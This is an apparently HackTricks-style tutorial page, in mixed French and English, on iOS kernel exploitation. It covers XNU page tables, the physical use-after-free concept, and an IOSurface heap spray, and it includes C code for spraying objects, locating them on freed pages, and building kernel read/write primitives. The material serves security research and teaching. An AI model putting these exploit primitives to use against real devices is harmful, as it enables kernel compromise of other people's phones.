# iOS Physical Use-After-Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

This is a summary from the post from [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) moreover further information about exploit using this technique can be found in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

L'espace d'adressage mémoire virtuel pour les processus utilisateur sur iOS s'étend de 0x0 à 0x8000000000. Toutefois, ces adresses ne correspondent pas directement à la mémoire physique. Le noyau utilise des tables de pages pour traduire les adresses virtuelles en adresses physiques réelles.

#### Levels of Page Tables in iOS

Les tables de pages sont organisées de manière hiérarchique en trois niveaux :

1. **L1 Page Table (Level 1)** :
* Chaque entrée ici représente une large plage de mémoire virtuelle.
* Elle couvre **0x1000000000 bytes** (ou **256 GB**) de mémoire virtuelle.
2. **L2 Page Table (Level 2)** :
* Une entrée ici représente une région plus petite de mémoire virtuelle, spécifiquement **0x2000000 bytes** (32 MB).
* Une entrée L1 peut pointer vers une table L2 si elle ne peut pas mapper toute la région elle-même.
3. **L3 Page Table (Level 3)** :
* C'est le niveau le plus fin, où chaque entrée mappe une page mémoire de **4 KB**.
* Une entrée L2 peut pointer vers une table L3 si un contrôle plus granulaire est nécessaire.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)** :
* Certaines entrées dans une table de pages mappent directement une plage d'adresses virtuelles à une plage contiguë d'adresses physiques (comme un raccourci).
* **Pointer to Child Page Table** :
* Si un contrôle plus fin est nécessaire, une entrée à un niveau (par exemple L1) peut pointer vers une table de pages enfant au niveau suivant (par exemple L2).

#### Example: Mapping a Virtual Address

Supposons que vous essayez d'accéder à l'adresse virtuelle **0x1000000000** :

1. **L1 Table** :
* Le noyau vérifie l'entrée correspondante de la table L1 pour cette adresse virtuelle. Si elle contient un **pointer to an L2 page table**, il se rend dans cette table L2.
2. **L2 Table** :
* Le noyau vérifie la table L2 pour un mapping plus détaillé. Si cette entrée pointe vers une **L3 page table**, il poursuit vers elle.
3. **L3 Table** :
* Le noyau consulte l'entrée finale L3, qui pointe vers l'adresse physique de la page mémoire réelle.

#### Example of Address Mapping

Si vous écrivez l'adresse physique **0x800004000** dans le premier index de la table L2, alors :

* Les adresses virtuelles de **0x1000000000** à **0x1002000000** sont mappées aux adresses physiques de **0x800004000** à **0x802004000**.
* C'est un **block mapping** au niveau L2.

Alternativement, si l'entrée L2 pointe vers une table L3 :

* Chaque page de 4 KB dans la plage virtuelle **0x1000000000 -> 0x1002000000** serait mappée par des entrées individuelles dans la table L3.

### Physical use-after-free

Un **physical use-after-free** (UAF) se produit lorsque :

1. Un processus **alloue** de la mémoire en lecture/écriture.
2. Les **tables de pages** sont mises à jour pour mapper cette mémoire vers une adresse physique spécifique accessible par le processus.
3. Le processus **désalloue** (libère) la mémoire.
4. Cependant, à cause d'un **bogue**, le noyau **oublie de supprimer le mapping** des tables de pages, même s'il marque la mémoire physique correspondante comme libre.
5. Le noyau peut alors **réallouer cette mémoire physique "libérée"** à d'autres fins, comme des structures de données du noyau.
6. Puisque le mapping n'a pas été supprimé, le processus peut toujours **lire et écrire** dans cette mémoire physique.

Cela signifie que le processus peut accéder à des pages de la mémoire du noyau, qui peuvent contenir des données sensibles ou des structures, permettant potentiellement à un attaquant de **manipuler la mémoire du noyau**.

### IOSurface Heap Spray

Since the attacker can’t control which specific kernel pages will be allocated to freed memory, they use a technique called **heap spray**:

1. The attacker **creates a large number of IOSurface objects** in kernel memory.
2. Each IOSurface object contains a **magic value** in one of its fields, making it easy to identify.
3. They **scan the freed pages** to see if any of these IOSurface objects landed on a freed page.
4. When they find an IOSurface object on a freed page, they can use it to **read and write kernel memory**.

More info about this in [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Be aware that iOS 16+ (A12+) devices bring hardware mitigations (like PPL or SPTM) that make physical UAF techniques far less viable.
> PPL enforces strict MMU protections on pages related to code signing, entitlements, and sensitive kernel data, so, even if a page gets reused, writes from userland or compromised kernel code to PPL-protected pages are blocked.
> Secure Page Table Monitor (SPTM) extends PPL by hardening page table updates themselves. It ensures that even privileged kernel code cannot silently remap freed pages or tamper with mappings without going through secure checks.
> KTRR (Kernel Text Read-Only Region), which locks down the kernel’s code section as read-only after boot. This prevents any runtime modifications to kernel code, closing off a major attack vector that physical UAF exploits often rely on.
> Moreover, `IOSurface` allocations are less predictable and harder to map into user-accessible regions, which makes the “magic value scanning” trick much less reliable. And `IOSurface` is now guarded by entitlements and sandbox restrictions.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: The attacker creates many IOSurface objects with a special identifier ("magic value").
2. **Scan Freed Pages**: They check if any of the objects have been allocated on a freed page.
3. **Read/Write Kernel Memory**: By manipulating fields in the IOSurface object, they gain the ability to perform **arbitrary reads and writes** in kernel memory. This lets them:
* Use one field to **read any 32-bit value** in kernel memory.
* Use another field to **write 64-bit values**, achieving a stable **kernel read/write primitive**.

Générez des objets IOSurface avec la valeur magique IOSURFACE\_MAGIC pour les rechercher ensuite:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Rechercher des objets **`IOSurface`** dans une page physique libérée :
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Obtention de lecture/écriture au noyau avec IOSurface

Après avoir pris le contrôle d'un objet IOSurface dans la mémoire du noyau (mappé sur une page physique libérée accessible depuis l'espace utilisateur), nous pouvons l'utiliser pour effectuer des opérations **de lecture et d'écriture arbitraires dans le noyau**.

**Champs clés dans IOSurface**

L'objet IOSurface possède deux champs cruciaux :

1. **Use Count Pointer** : Permet une **lecture 32-bit**.
2. **Indexed Timestamp Pointer** : Permet une **écriture 64-bit**.

En écrasant ces pointeurs, nous les redirigeons vers des adresses arbitraires dans la mémoire du noyau, ce qui active des capacités de lecture/écriture.

#### Lecture 32-bit du noyau

Pour effectuer une lecture :

1. Écrasez le **use count pointer** pour qu'il pointe vers l'adresse cible moins un décalage de 0x14 octets.
2. Utilisez la méthode `get_use_count` pour lire la valeur à cette adresse.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### Écriture 64 bits dans le kernel

Pour effectuer une écriture :

1. Écraser le **indexed timestamp pointer** pour qu'il pointe vers l'adresse cible.
2. Utiliser la méthode `set_indexed_timestamp` pour écrire une valeur 64 bits.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Récapitulatif du déroulement de l'exploit

1. **Trigger Physical Use-After-Free** : les pages libérées sont disponibles pour réutilisation.
2. **Spray IOSurface Objects** : Allouer de nombreux objets IOSurface avec une "magic value" unique dans kernel memory.
3. **Identify Accessible IOSurface** : Localiser un IOSurface sur une page libérée que vous contrôlez.
4. **Abuse Use-After-Free** : Modifier les pointeurs dans l'objet IOSurface pour permettre des **kernel read/write** arbitraires via les méthodes IOSurface.

Avec ces primitives, l'exploit fournit des **32-bit reads** contrôlés et des **64-bit writes** vers kernel memory. Les étapes de jailbreak ultérieures pourraient impliquer des primitives de lecture/écriture plus stables, ce qui peut nécessiter de contourner des protections supplémentaires (p. ex., PPL sur les appareils arm64e plus récents).

{{#include ../../banners/hacktricks-training.md}}
